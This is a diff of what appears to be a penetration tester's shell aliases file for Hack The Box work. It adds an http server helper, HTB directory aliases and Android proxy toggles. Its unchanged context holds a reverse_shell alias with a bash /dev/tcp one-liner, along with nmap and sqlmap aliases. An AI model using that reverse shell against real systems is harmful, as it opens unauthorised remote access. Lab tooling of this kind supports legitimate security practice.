@@ -36,12 +36,24 @@ gen_ps_rev () {
   fi
 }
 
-alias httpserver="python3 -m http.server $@"
+httpserver () {
+  if [[ -z "$1" ]] || [[ "$1" -gt 1024 ]]; then
+    python3 -m http.server "$@"
+  else
+    doas python3 -m http.server "$@"
+  fi
+}
+
+# alias httpserver="python3 -m http.server $@"
 export MIP=$(ifconfig tun0 2>/dev/null | grep inet | awk '{print $2}' | head -n1)
 alias mip="echo $MIP"
 alias reverse_shell="echo -n 'bash -c \"bash -i >& /dev/tcp/$MIP/9110 0>&1\"' | xclip -sel clip"
 alias scan="nmap -p- --min-rate=10000 -sCV -oN scans/full-scan.nmap -vvv $1"
-alias sqlreq="sqlmap -r $PWD/$@ --batch"
+alias sqlreq="sqlmap -r $PWD/$1 --batch"
 alias ww='cd /opt/share/www/'
+alias htb="cd ~/MMach/HTB/"
+alias mhtb="mkdir ~/MMach/HTB/$1"
+alias connect='cd /opt/shared/access'
+alias proxy_set='adb shell settings put global http_proxy 192.168.1.110:8080'
+alias proxy_unset='adb shell settings put global http_proxy :0'
 export WWW=/opt/shared/www/
-
